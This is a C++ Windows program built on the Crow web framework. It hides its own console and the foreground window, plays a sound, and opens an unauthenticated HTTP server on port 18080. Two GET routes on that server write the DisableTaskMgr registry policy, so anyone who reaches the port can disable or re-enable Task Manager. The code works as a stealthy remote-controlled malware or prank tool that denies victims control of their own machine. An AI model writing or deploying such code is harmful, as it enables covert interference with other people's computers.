#include "crow_.h"
#include <iostream>
#include <stdexcept>
#include <string>
#include <windows.h>
#include <mciapi.h>
#include <filesystem>
#include <mmsystem.h>


#if       _WIN32_WINNT < 0x0500
#undef  _WIN32_WINNT
#define _WIN32_WINNT   0x0500
#endif


#pragma comment(lib, "Winmm.lib")

using namespace std;


void PlayMP3() {
    PlaySound(TEXT("atlas.wav"), NULL, SND_FILENAME | SND_ASYNC);
}

void disableTaskManager() {
    int result = system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion"
        "\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
    if (result != 0) {
        throw runtime_error("Failed to disable Task Manager. Please run the program as Administrator.");
    }
}

void enableTaskManager() {
    int result = system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion"
        "\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f");
    if (result != 0) {
        throw runtime_error("Failed to enable Task Manager. Please run the program as Administrator.");
    }
}


void HideWindow() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE); 
    }

    HWND hWndApp = GetForegroundWindow(); 
    ShowWindow(hWndApp, SW_HIDE);
}

int main() {
    

    HideWindow();

    crow::SimpleApp app;

    PlayMP3();

    CROW_ROUTE(app, "/data/disable/tm").methods("GET"_method)([]() {
        try {
            disableTaskManager();
            return crow::response(200, R"({"disable": true})");
        }
        catch (const exception& e) {
            cerr << "Error: " << e.what() << endl;
            return crow::response(500, R"({"error": "Failed to disable Task Manager. Check logs for details."})");
        }
        });

    CROW_ROUTE(app, "/data/enable/tm").methods("GET"_method)([]() {
        try {
            enableTaskManager();
            return crow::response(200, R"({"enable": true})");
        }
        catch (const exception& e) {
            cerr << "Error: " << e.what() << endl;
            return crow::response(500, R"({"error": "Failed to enable Task Manager. Check logs for details."})");
        }
        });

    app.port(18080).multithreaded().run();

    return 0;
}
